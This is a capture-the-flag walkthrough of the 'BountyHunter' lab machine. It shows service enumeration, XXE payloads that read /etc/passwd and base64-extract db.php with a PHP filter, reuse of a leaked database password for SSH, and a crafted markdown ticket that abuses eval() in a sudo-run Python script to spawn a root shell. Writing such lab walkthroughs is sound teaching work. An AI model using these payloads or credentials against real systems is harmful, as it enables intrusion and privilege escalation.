# Enumeration

Starting with nmap
```bash
Nmap scan report for 10.10.11.100
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
```
Looking at results, we have port 80 and 22 open.

### PORT 80
Looking at the webpage

![image](https://user-images.githubusercontent.com/94787830/143477284-b2ac5b9a-456a-4aed-a03c-634570dee48e.png)

The About and Contact links just lead to areas on the main page. The Portal link leads to a simple page that says it’s still under development.

![image](https://user-images.githubusercontent.com/94787830/143478304-281515b2-eced-4a98-bf8b-dfdc4ce34414.png)


Clicking the link leads us to `/log_submit.php` which seems like a bug reporting form.

![image](https://user-images.githubusercontent.com/94787830/143478858-69b87ed6-2ed8-4841-9af0-bc9e9b1cccd1.png)


Running ffuf at the backend for directory brute forcing, we found
```bash
ffuf -u http://10.10.11.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php                                                                                  
________________________________________________                                                                                                                         
 :: Method           : GET
 :: URL              : http://10.10.11.100/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                                                                                              
__________________________________________                                                                                                                         
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]                                                                                             
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]                                                                                             
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                                 
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]                                                                                       
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]                                                                                       
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]                                                                                            
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]                                                                                             
resources               [Status: 301, Size: 316, Words: 20, Lines: 10]                                                                                             
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```
The result gave us couple of interesting files, one *db.php* and other *resource* folder.
Resource folder had directory listing on which allow us to see all other files in that direcotry. 


```
# File: Readme.txt
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```
According to the note, a login section exists, with a ‘test’ account probably existing on it. There could also be a database on the system, we can interact with.

Another usefull file was `bountylog.js`.Checking the content of the file, we have  
```javascript
/* File: bountylog.js */

function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```
The `/log_submit.php` initiate the above code. The code makes a post requests to `tracker_diRbPr00f314.php` with the user input formated in XML form encoded in base64. As the code, directly take our input and forms a XML document to send to server, this might be vulnerable to XXE Injection.

Navgating to `/log_submit.php`, submitting the values, we see our data was being sent in base64 encoded form decoding which leads to XML formatted data. First thing to try, XXE Injection. Using a simple payload to grab the passwd file and encoding it with base64, we were able to get the file. 
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'file:///etc/passwd'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```


![image](https://user-images.githubusercontent.com/94787830/143480890-be68bb2e-b047-44ee-b894-82328869910c.png)

We can here try to get any ssh private keys, but we were not able to in this case. From our directory bruteforcing, we found `db.php`, we could try to exfill that file. But to exfill PHP codes, we need to use PHP filters.
Using a payload from [payload-all-the-things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe), we can change it accordingly for our box
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```
Encode and send the request, and we got the output. Decoding the output, we have
```php
// db.php file

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
We have a potential password and from passwd file, we can get the usernames.
```bash
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```
We can try ssh into the box with the creds, and indeed it worked.

## Shell as development
```bash
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
```
Checking for sudo permission,
```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
The *development* user have permission to run `ticketValidator.py` as root. Checking the script,
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            print(ticketCode)
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                print(f"validation num: {validationNumber}")
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
Here, the script checks few things:
- looks for .md extension, 
- First row starts with "# Skytrain Inc"
- Second row starts with "## Ticket to "
- There needs to be a line that starts with "\_\_Ticket Code:_\_\"
- Ticket number divided by 7 should have remaineder 4

Upon satisfying the above condition, its calling `eval` function.
Eval function can be dangerous in Python. 

To exploit it, we need to make a markdown file satisfying all the conditions and hit the eval function to get our malicious code to execute.

Our Malicious Markdown file can be created as follows:
```markdown
# Skytrain Inc
## Ticket to abc
__Ticket Code:__
**11+exec('''import os;os.system('/bin/bash -p')''')
```

Running the python script with above markdown file gave us Root shell.
ROOT!!
